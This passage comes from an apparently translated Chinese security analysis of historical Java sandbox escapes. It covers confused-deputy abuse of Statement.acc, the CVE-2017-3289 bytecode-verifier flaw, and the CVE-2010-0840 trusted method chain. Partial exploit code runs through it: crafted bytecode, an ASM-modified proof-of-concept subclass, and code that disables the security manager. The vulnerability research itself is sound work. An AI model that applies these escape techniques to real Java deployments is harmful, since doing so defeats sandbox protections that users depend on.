class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class klass,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">2</span>: <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line"> <span class="number">3</span>:  <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line"> <span class="number">4</span>: <span class="keyword">new</span> PrivilgedAction&lt;Field&gt;() &#123;</span><br><span class="line"> <span class="number">5</span>: <span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>: ...</span><br><span class="line"> <span class="number">7</span>: Field field = klass.getDeclaredField(fieldName);</span><br><span class="line"> <span class="number">8</span>: ...</span><br><span class="line"> <span class="number">9</span>: field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">10</span>: <span class="keyword">return</span> field;</span><br><span class="line"><span class="number">11</span>: ...</span><br></pre></td></tr></table></figure><p>　　接下来，我们创建一个<em>AccessControlContext</em>，它被分配了所有权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Permissions permissions = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">2</span>: permissions.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">3</span>: ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(</span><br><span class="line"><span class="number">4</span>: <span class="keyword">new</span> URL(<span class="string">"file:///"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), permissions);</span><br><span class="line"><span class="number">5</span>: AccessControlContext newAcc =</span><br><span class="line"><span class="number">6</span>: AccessControlContext(<span class="keyword">new</span> ProtectionDomain[] &#123;pd&#125;);</span><br></pre></td></tr></table></figure><p>　　<em>Statement</em>对象可以表示任意方法调用。创建<em>Statement</em>实例时，它会将当前安全上下文存储在Statement.acc中。调用Statement.execute（）时，它将执行它在最初存储在Statement.acc中的安全上下文中表示的调用，以确保它使用与直接调用它相同的权限调用该方法。<br>　　接下来，我们创建一个表示调用System.setSecurityManager（null）的<em>Statement</em>，并使用具有所有权限的新<em>AccessControlContext</em>覆盖存储在Statement.acc中的<em>AccessControlContext</em>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Statement stmt = <span class="keyword">new</span> Statement(System.class, <span class="string">"setSecurityManager"</span>,</span><br><span class="line"><span class="number">2</span>: <span class="keyword">new</span> Object[<span class="number">1</span>]);</span><br><span class="line"><span class="number">3</span>: acc.set(stmt, newAcc)</span><br></pre></td></tr></table></figure><p>　　最后，我们调用stmt.execute（）来实际执行对setSecurityManager（）的调用。此调用将成功，因为我们已将stmt.acc中的安全上下文替换为已分配了所有权限的安全上下文。</p><h5 id="4-1-3-讨论"><a href="#4-1-3-讨论" class="headerlink" title="4.1.3 讨论"></a>4.1.3 讨论</h5><p>　　混乱的代理攻击问题自然源于Java平台安全的核心概念。沙箱的一个关键机制是基于堆栈的访问控制，其在尝试敏感操作时检查调用堆栈，从而检测例如从不可信代码到敏感类成员的直接访问。但是，在许多情况下，此堆栈检查会在检查当前堆栈上的所有调用方是否具有适当权限之前终止。发生这种情况时有两种常见情况。在第一种情况下，堆栈上的一个调用者调用doPrivileged（）来显式声明所需的操作被认为是安全的，即使从非特权代码调用也是如此。而doPrivileged（）通常是一种明智的机制，在未采取所有预防措施以确保特定操作安全的情况下，它也可能被错误地使用。在第二种情况下，系统类中的方法将仅手动检查直接调用方的属性，并跳过JVM的访问控制机制，该机制还将检查堆栈上的其他调用方。在这两种情况下，分析人员只需代表系统类执行某些敏感操作，就可以从不完整的堆栈遍历中获益。</p><h4 id="4-2-未初始化的实例"><a href="#4-2-未初始化的实例" class="headerlink" title="4.2 未初始化的实例"></a>4.2 未初始化的实例</h4><h5 id="4-2-1-背景"><a href="#4-2-1-背景" class="headerlink" title="4.2.1 背景"></a>4.2.1 背景</h5><p>　　Java对象初始化中的关键步骤是调用相应类型的构造函数。构造函数包含变量初始化的必要代码，但也可能包含安全性检查。因此，对于平台的安全性和稳定性来说，强制在对象初始化完成之前实际调用构造函数并且其他代码调用该类型的方法是很重要的。<br>　　执行构造函数调用由字节码验证器负责，它在加载期间检查所有类以确保其有效性。这还包括，例如，检查跳转是否落在有效指令上而不是在指令的中间，并检查控制流是否以返回指令结束。此外，它还检查指令是否对有效类型进行操作，这是防止类型混淆攻击所必需的，我们在第3.1.1节中介绍了这些类型。<br>　　从历史上看，为了检查类型有效性，JVM依靠数据流分析来计算修复点。该分析可能需要在相同路径上执行多次传递。由于这是耗时的，并且可能使类加载过程变慢，因此已经开发了一种新方法来在线性时间中执行类型检查，其中每个路径仅被检查一次。为此，沿字节码添加了称为堆栈映射帧的元信息。简而言之，堆栈映射框描述了每个分支目标的可能类型。堆栈映射帧存储在称为堆栈映射表的结构中。<br>　　当分析人员能够创建一个实例，在该实例上不执行对<init>（*）的调用，对象的构造函数或超类的构造函数的操作时，会出现未初始化的实例漏洞。此漏洞直接违反了虚拟机的规范。对JVM安全性的影响是，对于未初始化的实例漏洞，分析人员可以实例化他不应该访问的对象，并且可以访问他不应该访问的属性和方法。这可能会导致沙箱逃逸。</init></p><h5 id="4-2-2-示例：CVE-2017-3289"><a href="#4-2-2-示例：CVE-2017-3289" class="headerlink" title="4.2.2 示例：CVE-2017-3289"></a>4.2.2 示例：CVE-2017-3289</h5><p>　　CVE的描述表明“此漏洞的成功攻击可能导致Java SE，Java SE Embedded的接管”。至于CVE-2017-3272，这意味着可能利用漏洞逃脱Java沙箱。<br>　　Redhat的bugzilla表示“在OpenJDK的Hotspot组件中发现了与不正确的异常堆栈帧处理有关的不安全的类构造缺陷。不受信任的Java应用程序或applet可能会利用这个漏洞绕过Java沙箱限制。”。这告诉分析师：（1）漏洞在于C / C ++代码（Hotspot是Java VM的名称），以及（2）漏洞与非法类构造和异常堆栈帧有关。信息（2）<br>表示该漏洞可能在C / C ++代码中检查字节码的有效性。该页面还链接到此漏洞的OpenJDK补丁。<br>　　OpenJDK的修补程序“8167104：修复漏洞的其他类构建改进”可在线获取。修补了五个C ++文件：“classfile / verifier.cpp”，负责验证类文件结构和有效性的类，“classfile / stackMapTable。{cpp，hpp}”，处理堆栈映射表的文件，以及“classfile / stackMapFrame。{cpp，hpp}”，表示堆栈映射帧的文件。<br>　　通过查看diff，我们发现已经删除了函数StackMapFrame :: has_flag_match_exception（），并且通过删除对has_flag_match_exception（）的调用来更新我们将称为C1的条件。此外，方法match_stackmap（）和is_assignable_to（）现在只有一个参数：“bool handler”已被删除。如果验证程序当前正在检查异常处理程序，则此参数“handler”设置为“true”。条件C1如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">-  bool match_flags = (_flags | target-&gt;flags()) == target-&gt;flags();</span><br><span class="line">-  if (match_flags || is_exception_handler &amp;&amp;</span><br><span class="line">         has_flag_match_exception(target)) &#123;</span><br><span class="line">+  if ((_flags | target-&gt;flags()) == target-&gt;flags()) &#123;</span><br><span class="line">     return true;</span><br><span class="line">   &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>　　这个条件在函数is_assignable_to（）中，它检查当前堆栈映射帧是否可分配给目标堆栈映射帧，作为参数传递给函数。在补丁之前，返回“true”的条件是“match_flags || is_exception_handler &amp;&amp; has_flag_match_exception（target）”。在英语中，这意味着当前堆栈映射帧和目标堆栈映射帧的标志相同或者当前指令在异常处理程序中，并且函数“has_flag_match_exception”返回“true”。注意，只有一种标志叫做“UNINITIALIZED_THIS”（又名FLAG_THIS_UNINIT）。如果此标志为true，则表示“this”引用的对象未初始化，即尚未调用其构造函数。<br>　　在补丁之后，条件变为“match_flags”。这意味着，在易受攻击的版本中，可能有一种方法来构造“match_flags”为假的字节码（即“this”在当前帧中具有未初始化的标志但在目标帧中没有，但是“ is_exception_handler“是”true“（当前指令在异常处理程序中）并且”has_flag_match_exception（target）“返回”true“。但是这个函数何时返回“true”？<br>　　函数has_flag_match_exception（）在以下列表中表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: ....</span><br><span class="line"> <span class="number">2</span>: bool StackMapFrame::has_flag_match_exception(</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">const</span> StackMapFrame* target) <span class="keyword">const</span> &#123;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">assert</span>(max_locals() == target-&gt;max_locals() &amp;&amp;</span><br><span class="line"> <span class="number">6</span>:          stack_size() == target-&gt;stack_size(),</span><br><span class="line"> <span class="number">7</span>:                <span class="string">"StackMap sizes must match"</span>);</span><br><span class="line"> <span class="number">8</span>:</span><br><span class="line"> <span class="number">9</span>:   VerificationType top = VerificationType::top_type();</span><br><span class="line"><span class="number">10</span>:   VerificationType this_type = verifier()-&gt;current_type();</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>:   <span class="keyword">if</span> (!flag_this_uninit() || target-&gt;flags() != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">13</span>:     <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">14</span>:   &#125;</span><br><span class="line"><span class="number">15</span>:</span><br><span class="line"><span class="number">16</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;locals_size(); ++i) &#123;</span><br><span class="line"><span class="number">17</span>:     <span class="keyword">if</span> (locals()[i] == this_type &amp;&amp; target-&gt;locals()[i] != top) &#123;</span><br><span class="line"><span class="number">18</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">19</span>:     &#125;</span><br><span class="line"><span class="number">20</span>:   &#125;</span><br><span class="line"><span class="number">21</span>:</span><br><span class="line"><span class="number">22</span>:   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target-&gt;stack_size(); ++i) &#123;</span><br><span class="line"><span class="number">23</span>:     <span class="keyword">if</span> (stack()[i] == this_type &amp;&amp; target-&gt;stack()[i] != top) &#123;</span><br><span class="line"><span class="number">24</span>:       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="number">25</span>:     &#125;</span><br><span class="line"><span class="number">26</span>:   &#125;</span><br><span class="line"><span class="number">27</span>:</span><br><span class="line"><span class="number">28</span>:   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="number">29</span>: &#125;</span><br><span class="line"><span class="number">30</span>: ....</span><br></pre></td></tr></table></figure><p>　　为了使此函数返回“true”，必须通过以下所有条件：（1）当前帧和目标帧的最大局部变量数和堆栈的最大大小必须相同（第5-7行））; （2）当前帧必须将“UNINIT”标志设置为“true”（第12-14行）; （3）目标框架中没有使用未初始化的对象（第16-26行）。<br>　　以下清单说明了满足以下三个条件的字节码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;()</span><br><span class="line">0: new           // class java/lang/Throwable</span><br><span class="line">1: dup</span><br><span class="line">2: invokespecial // Method java/lang/Throwable.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">3: athrow</span><br><span class="line">4: new           // class java/lang/RuntimeException</span><br><span class="line">5: dup</span><br><span class="line">6: invokespecial // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">7: athrow</span><br><span class="line">8: return</span><br><span class="line">Exception table:</span><br><span class="line"> from    to  target type</span><br><span class="line">    0    4    8   Class java/lang/Throwable</span><br><span class="line">    StackMapTable: number_of_entries = 2</span><br><span class="line">      frame at instruction 3</span><br><span class="line">        local = [UNINITIALIZED_THIS]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br><span class="line">      frame at instruction 8</span><br><span class="line">        locals = [TOP]</span><br><span class="line">        stack = [ class java/lang/Throwable ]</span><br></pre></td></tr></table></figure><p>　　最大本地数和最大堆栈大小可以设置为2以满足第一个条件。当前帧在第3行将“UNINITIALIZED_THIS”设置为true以满足第二个条件。最后，为了满足第三个条件，未初始化的局部因素不用于“athrow”指令的目标（第8行），因为本地的第一个元素被初始化为“TOP”。<br>　　请注意，代码位于try / catch块中，以便在函数is_assignable_to（）中将“is_exception_handler”设置为“true”。此外，请注意字节码在构造函数中（字节码中的<init>（））。这是必须的，以便将标志“UNINITIALIZED_THIS”设置为true。<br>　　我们现在知道分析师能够制作返回其自身未初始化对象的字节码。乍一看，可能很难看出分析师如何使用这样的对象。但是，仔细观察可以看出，这样一个被操作的类可以实现为系统类的子类，可以在不调用超类的构造函数super。<init>（）的情况下进行初始化。这可用于实例化公共系统类，否则这些类不能由不受信任的代码实例化，因为它们的构造函数是私有的，或包含权限检查。下一步是找到为分析师提供“有趣”功能的类。目的是将所有功能组合在一起，以便能够在沙箱环境中执行任意代码，从而绕过沙箱。然而，找到有用的类本身就是一项复杂的任务。具体而言，我们面临着以下挑战。</init></init></p><ul><li><p>挑战1：在哪里寻找帮助代码<br>JRE附带了许多包含JCL（Java类库）类的jar文件。这些类作为<em>trusted</em> classes加载，并且可以在构造漏洞利用时使用。不幸的是对于分析师来说，但幸运的是，对于Java用户来说，越来越多的类被标记为“受限制”，这意味着<em>untrusted</em>代码无法直接实例化它们。限制包的数量从1.6.0_01中的一个变为1.8.0_121中的47。这意味着分析师在构建漏洞利用时无法直接使用的代码百分比从1.6.0_01中的20％变为1.8.0_121中的54％。</p></li><li><p>挑战2：字段可能未初始化<br>如果没有适当的权限，通常无法实例化新的类加载器。在构造函数中检查<em>ClassLoader</em>类的权限，初看起来似乎是一个有趣的目标。由于CVE-2017-3289的漏洞，确实可以在没有权限的情况下实例化新的类加载器，因为构造函数代码 - 以及权限检查 - 将不会被执行。但是，由于绕过了构造函数，因此使用默认值初始化字段（例如，对于整数为零，对于引用为null）。这是有问题的，因为通常允许定义具有所有特权的新类的有趣方法将失败，因为代码将尝试取消引用尚未正确初始化的字段。在手动检查之后，似乎很难绕过字段解除引用，因为所有路径都通过取消引用非初始化字段的指令。利用<em>ClassLoader</em>似乎是一个死胡同。当使用CVE-2017-3289的漏洞时，非初始化字段是一个主要挑战：除了要求目标类是公共的，非最终的和非限制的，其感兴趣的方法也不应该执行方法取消引用未初始化的字段。</p></li></ul><p>　　我们还没有找到Java版本1.8.0更新112的有用帮助代码。为了说明CVE-2017-3289的漏洞如何工作，我们将展示利用0422和0431的漏洞的替代帮助代码。这两个漏洞依赖于<em>MBeanInstantiator</em>，一个类定义了可以加载任意类的方法findClass（）。类<em>MBeanInstantiator</em>只有私有构造函数，因此无法进行直接实例化。最初，这些漏洞使用<em>JmxMBeanServer</em>来创建<em>MBeanInstantiator</em>的实例。我们将展示分析师可以直接子类化<em>MBeanInstantiator</em>并使用漏洞3289来获取它的实例。<br>　　用于实例化<em>MBeanInstantiator</em>的原始帮助程序代码依赖于<em>JmxMBeanServer</em>，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: JmxMBeanServerBuilder serverBuilder = <span class="keyword">new</span> JmxMBeanServerBuilder();</span><br><span class="line"><span class="number">2</span>: JmxMBeanServer server =</span><br><span class="line"><span class="number">3</span>:      (JmxMBeanServer) serverBuilder.newMBeanServer(<span class="string">""</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="number">4</span>: MBeanInstantiator instantiator = server.getMBeanInstantiator();</span><br></pre></td></tr></table></figure><p>　　实例化<em>MBeanInstantiator</em>的替代代码利用了CVE-2017-3289的漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoCMBeanInstantiator</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">PoCMBeanInstantiator</span><span class="params">(ModifiableClassLoaderRepository clr)</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">7</span>:     <span class="keyword">return</span> <span class="keyword">new</span> PoCMBeanInstantiator(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　请注意，由于<em>MBeanInstantiator</em>没有任何公共构造函数，<em>PoCMBeanInstantiator</em>必须在源代码中扩展一个虚拟类，在我们的示例中为<em>java.lang.Object</em>。我们使用ASM字节码操作库，将<em>PoCMBeanInstantiator</em>的超类更改为<em>MBeanInstantiator</em>。我们还使用ASM来更改构造函数的字节码以绕过对super。<init>（*）的调用。<br>　　自Java 1.7.0更新13以来，Oracle已将<em>com.sun.jmx.</em>添加为受限程序包。类<em>MBeanInstantiator</em>在此包中，因此无法在更高版本的Java中重用此帮助程序代码。<br>　　令我们惊讶的是，此漏洞影响了40多个不同的公开发布。从更新0到更新80的所有Java 7版本都会受到影响。从更新5到更新112的所有Java 8版本也会受到影响。Java 6不受影响。<br>　　通过查看Java 6更新43的字节码验证器和Java 7更新0的源代码之间的差异，我们注意到diff的主要部分对应于上面提供的补丁的逆。这意味着在构造函数中异常处理程序中堆栈帧可分配给目标堆栈帧的条件已被削弱。diff中的注释表明这个新代码已经通过请求7020118添加。此请求要求更新字节码验证程序的代码，以便NetBeans的分析器可以生成处理程序以覆盖构造函数的整个代码。<br>　　通过收紧约束来修复漏洞，在该约束下，当前堆栈帧（在try / catch块中的构造函数中）可以分配给目标堆栈帧。这有效地防止字节码从构造函数返回未初始化的“this”对象。<br>　　据我们所知，Java至少有三个公开的<em>uninitialized instance</em>漏洞。一个是本文中描述的CVE-2017-3289。第二个是在2002年发现的。作者还利用了字节码验证器中的漏洞，该漏洞使得不能调用超类的构造函数。他们无法开发漏洞来完全逃离沙箱。但是，他们能够访问网络并将文件读写到磁盘。第三个是1996年普林斯顿的一个研究小组发现的。同样，问题出在字节码验证器中。它允许构造函数捕获对super（）的调用抛出的异常并返回部分初始化的对象。请注意，在此次攻击时，类加载器类没有任何实例变量。因此，利用漏洞来实例化类加载器给出了一个完全初始化的类加载器，可以在其上调用任何方法。</init></p><h5 id="4-2-3-讨论"><a href="#4-2-3-讨论" class="headerlink" title="4.2.3 讨论"></a>4.2.3 讨论</h5><p>　　此漏洞的根本原因是对C / C ++字节码验证代码的修改，该代码使分析人员能够创建Java字节码，该字节码无法绕过对子类构造函数中的super（）的调用。此漏洞直接违反了虚拟机的规范。<br>　　但是，如果没有适当的<em>helper</em>代码，此漏洞将毫无用处。Oracle开发了静态分析工具来查找危险的小工具并将其列入黑名单。这使得分析师更难以绕过沙箱开发漏洞利用程序。实际上，我们只发现了与旧版JVM一起使用的有趣小工具。由于它们已被列入最新版本的黑名单，因此攻击不再起作用。然而，即使该方法依赖于静态分析，它（1）可能会产生许多误报，这使得识别真正危险的小工具变得更加困难，并且（2）可能具有错误的否定因为它不能真实地模拟语言的所有特定性，通常反射和JNI，因此不健全。</p><h4 id="4-3-可信方法链"><a href="#4-3-可信方法链" class="headerlink" title="4.3 可信方法链"></a>4.3 可信方法链</h4><h5 id="4-3-1-背景"><a href="#4-3-1-背景" class="headerlink" title="4.3.1 背景"></a>4.3.1 背景</h5><p>　　每当在Java中执行安全检查时，都会检查整个调用堆栈。调用堆栈的每个帧都包含由其类和方法签名标识的方法名称。可信方法链攻击的想法是在调用堆栈上只有受信任的类。为实现此目的，分析人员通常依赖于受信任类中存在的反射功能来调用目标方法。这样，当安全检查完成并且目标方法将在特权上下文中执行时（通常禁用安全管理器），调用堆栈上不会有应用程序类（不可信）。为了使这种方法起作用，方法链必须位于特权线程上，例如事件线程。它不能在主线程上工作，因为具有main方法的类被认为是不可信的，因此安全检查将引发异常。</p><h5 id="4-3-2-示例：CVE-2010-0840"><a href="#4-3-2-示例：CVE-2010-0840" class="headerlink" title="4.3.2 示例：CVE-2010-0840"></a>4.3.2 示例：CVE-2010-0840</h5><p>　　此漏洞是针对Java平台的可信方法链攻击的第一个示例。它依赖于<em>java.beans.Statement</em>类来通过反射执行目标方法。该漏洞利用了一个<em>JList</em> GUI元素（“一个显示对象列表并允许用户选择一个或多个项目的组件。”）强制GUI线程绘制新元素。漏洞利用代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// target method</span></span><br><span class="line">   Object target = System.class;</span><br><span class="line">   String methodName = <span class="string">"setSecurityManager"</span>;</span><br><span class="line">   Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span> &#125;;</span><br><span class="line"></span><br><span class="line">   Link l = <span class="keyword">new</span> Link(target, methodName, args);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">final</span> HashSet s = <span class="keyword">new</span> HashSet();</span><br><span class="line">   s.add(l);</span><br><span class="line"></span><br><span class="line">   Map h = <span class="keyword">new</span> HashMap() &#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Set <span class="title">entrySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> s;</span><br><span class="line">   &#125;; &#125;;</span><br><span class="line"></span><br><span class="line">   sList = <span class="keyword">new</span> JList(<span class="keyword">new</span> Object[] &#123; h &#125;);</span><br></pre></td></tr></table></figure><p>　　目标方法通过<em>Link</em>对象表示为<em>Statement</em>。<em>Link</em>类不是来自JCL的类，而是由分析师构造的类。<em>Link</em>类是<em>Expression</em>的子类，它是<em>Statement</em>的子类。<em>Link</em>对象也以伪方式实现<em>java.util.Map.Entry</em>接口的getValue（）方法。它不是<em>Entry</em>接口的真正实现，因为只存在getValue（）方法。这种“实现”不能用普通的javac编译器完成，必须通过直接修改<em>Link</em>类的字节码来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">   [...]</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns the value corresponding to this entry.  If the mapping</span></span><br><span class="line"><span class="comment">   * has been removed from the backing map (by the iterator's</span></span><br><span class="line"><span class="comment">   * &lt;tt&gt;remove&lt;/tt&gt; operation), the results of this call are</span></span><br><span class="line"><span class="comment">   * undefined.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the value corresponding to this entry</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> IllegalStateException implementations may, but are not</span></span><br><span class="line"><span class="comment">   *         required to, throw this exception if the entry has been</span></span><br><span class="line"><span class="comment">   *         removed from the backing map.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function">V <span class="title">getValue</span><span class="params">()</span></span>;</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure><p>　　该接口具有getValue（）方法。事实证明<em>Expression</em>类也有一个具有相同签名的getValue（）方法。这就是为什么在运行时在<em>Link</em>类型的对象上调用Entry.getValue（），伪造<em>Entry</em>的实现，可以成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in AbstractMap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">   <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"&#123;&#125;"</span>;</span><br><span class="line"></span><br><span class="line">   StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   sb.append(<span class="string">'&#123;'</span>);</span><br><span class="line">   <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">        K key = e.getKey();</span><br><span class="line">        V value = e.getValue();</span><br><span class="line">        sb.append(key   == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : key);</span><br><span class="line">        sb.append(<span class="string">'='</span>);</span><br><span class="line">        sb.append(value == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : value);</span><br><span class="line">        <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">        <span class="keyword">return</span> sb.append(<span class="string">'&#125;'</span>).toString();</span><br><span class="line">        sb.append(<span class="string">','</span>).append(<span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　分析师的目的是调用AbstractMap.toString（）方法来调用<em>Link</em>对象上的Entry.getValue（），该对象调用invoke（）方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (value == unbound) &#123;</span><br><span class="line">        setValue(invoke());</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　invoke方法通过反射执行分析师的目标方法System.setSecurityManapger（null）以禁用安全管理器。通过反射调用此方法时的调用堆栈如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 